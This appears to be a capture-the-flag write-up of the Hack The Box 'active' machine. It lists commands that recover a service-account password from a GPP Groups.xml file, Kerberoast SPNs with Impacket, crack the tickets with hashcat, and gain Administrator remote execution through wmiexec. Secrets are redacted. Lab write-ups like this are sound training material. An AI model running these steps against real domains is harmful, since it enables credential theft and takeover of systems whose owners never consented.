---
title: "Replication — active.htb"
date: 2025-11-02
tags: [htb, active-directory, kerberoast, gpp]
summary: "AD enumeration → recovered service-account via GPP → Kerberoast → Administrator → flags. Sensitive values redacted."
---

## TL;DR
full-TCP scan → found an open SMB share and downloaded its contents → decrypted GPP XML and recovered `active.<DOMAIN>\SVC_TGS` plaintext credential → used SVC_TGS to access files and retrieve **user.txt** → enumerated Kerberos SPNs for kerberoastable accounts with the service account → checked DC time via LDAP and fixed local clock skew → requested TGS blobs (GetUserSPNs) → cracked TGS blobs offline (hashcat) to recover an elevated credential → authenticated as Administrator and used remote exec (wmiexec/psexec) to retrieve **root.txt**. Sensitive values redacted.

---

## Chronology, commands, concise notes (sanitized; redact before publishing)

### 1) Discovery — full TCP sweep
```bash
sudo nmap -p- -T4 192.0.2.100 -oN scans/all_ports.txt

2) Extract open ports for targeted scan

ports=$(awk '/\/tcp/ && /open/ { split($1,a,"/"); p = (p ? p "," a[1] : a[1]) } END{ print p }' scans/all_ports.txt)
sudo nmap -sC -sV -p "$ports" 192.0.2.100 -oN scans/version.txt

3) Hostname mapping for AD tools

echo '192.0.2.100 dc.example.test dc' | sudo tee -a /etc/hosts

4) SMB enumeration — found an open, readable SMB share

smbclient -L //192.0.2.100 -N -I 192.0.2.100

5) Download share contents (artifact collection)

mkdir -p workspace && cd workspace
smbclient //192.0.2.100/<SHARE> -N -I 192.0.2.100 -c "recurse; prompt; mget *"
tree -a -h -f --dirsfirst

(share name intentionally omitted from public materials; recorded privately)
6) Decrypt GPP XML — recover service-account credential

gpp-decrypt -f "./active.<DOMAIN>/Policies/{GUID}/MACHINE/Preferences/Groups/Groups.xml"
# local output: active.<DOMAIN>\SVC_TGS : <PLAINTEXT_PASSWORD>  (DO NOT PUBLISH)

7) Use SVC_TGS to access files — obtained user.txt

nxc smb 192.0.2.100 -u 'active.<DOMAIN>\SVC_TGS' -p '<REDACTED_PASSWORD>' --shares
# retrieve user.txt from accessible location

8) Enumerate Kerberos SPNs (kerberoastable accounts)

python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py 'active.<DOMAIN>/SVC_TGS:<REDACTED_PASSWORD>' -dc-ip 192.0.2.100 -request -outputfile tgs_hashes.txt

9) Check DC time and sync local clock (if KRB_AP_ERR_SKEW)

ldapsearch -x -H ldap://192.0.2.100 -s base -b "" currentTime
sudo date -u -s "YYYY-MM-DD HH:MM:SS"

10) Re-run GetUserSPNs to collect TGS blobs

python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py 'active.<DOMAIN>/SVC_TGS:<REDACTED_PASSWORD>' -dc-ip 192.0.2.100 -request -outputfile tgs_hashes.txt

11) Crack TGS blobs offline (Kerberoast)

hashcat -m 13100 tgs_hashes.txt /path/to/wordlist.txt -a 0

12) Authenticate as Administrator & remote execution

nxc smb 192.0.2.100 -u 'active.<DOMAIN>\Administrator' -p '<REDACTED_ADMIN_PASSWORD>' --shares
python3 /usr/share/doc/python3-impacket/examples/wmiexec.py 'ACTIVE.<DOMAIN>/Administrator:<REDACTED_ADMIN_PASSWORD>'@192.0.2.100
# within wmiexec:
type C:\Users\Administrator\Desktop\root.txt

Tools & techniques demonstrated

nmap, smbclient / nxc, gpp-decrypt, Impacket GetUserSPNs.py, ldapsearch, hashcat, Impacket wmiexec.py/psexec — AD enumeration, GPP credential recovery, Kerberoast (TGS collection + offline cracking), remote execution.
Publication policy applied

    Prose uses <TARGET_IP> / <DOMAIN>.

    Code examples/screenshots use documentation IP 192.0.2.100 and dc.example.test.

    Share name intentionally omitted from public materials; retained privately.

    Never publish plaintext credentials, hashes, flags, or real IPs/domains. Keep raw artifacts in NOTES_PRIVATE.md and add to .gitignore.

    Sanitize screenshots (blur/overlay secrets).
